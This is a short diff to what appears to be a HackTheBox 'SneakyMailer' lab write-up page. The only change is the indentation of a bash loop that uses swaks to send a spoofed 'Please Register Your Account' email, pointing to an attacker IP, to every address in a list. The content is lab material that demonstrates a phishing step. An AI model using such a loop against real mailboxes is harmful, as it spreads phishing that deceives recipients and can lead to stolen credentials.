@@ -312,15 +312,15 @@ Connection closed by foreign host.
                             <tr>Bash script to send emails to a list</tr>
                             <tr>
                                 <pre>
-                                    for email in $(cat email.lst);
-                                    do
-                                    swaks \
-                                    --from support@sneakymailer.htb \
-                                    --to $email \
-                                    --header 'Subject: Please Register Your Account' \
-                                    --body 'http://10.10.14.106/test' \
-                                    --server sneakymailer.htb
-                                    done;
+for email in $(cat email.lst);
+do
+swaks \
+--from support@sneakymailer.htb \
+--to $email \
+--header 'Subject: Please Register Your Account' \
+--body 'http://10.10.14.106/test' \
+--server sneakymailer.htb
+done;
                                 </pre>
                             </tr>
                         </tr>
